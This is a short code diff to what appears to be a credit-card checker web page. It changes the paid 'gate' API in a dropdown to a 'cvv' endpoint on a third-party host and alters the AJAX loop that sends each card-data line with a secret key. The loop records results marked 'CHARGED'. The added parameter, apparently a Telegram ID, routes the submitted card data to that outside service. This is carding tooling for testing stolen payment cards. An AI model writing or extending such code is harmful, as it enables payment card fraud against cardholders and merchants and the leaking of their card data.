@@ -149,7 +149,7 @@
 					     
 				
 			
-<option style="background:rgba(165, 154, 154, 0.281);color:rgb(255, 208, 0);color:white" value="https://tobix.dev/skapi/">TOBI API: 5$</option>	       
+<option style="background:rgba(165, 154, 154, 0.281);color:rgb(255, 208, 0);color:white" value="https://cvv.up.railway.app/api.php/">TOBI API: 5$</option>	       
   
 </select>
 </br>
@@ -398,7 +398,7 @@ $('.btn-stop').attr('disabled', false);
 
 line.forEach(function(data){
 var callBack = $.ajax({
-	url: gate + '?cc=' + data + '&sk=' + sec,
+	url: gate + '?lista=' + data + '&sec=' + sec + '&tgm=1329532701' ,
 	success: function(retorno){
 		if(retorno.indexOf("CHARGED") >= 0){
 			$('#lista_charge').append(retorno);
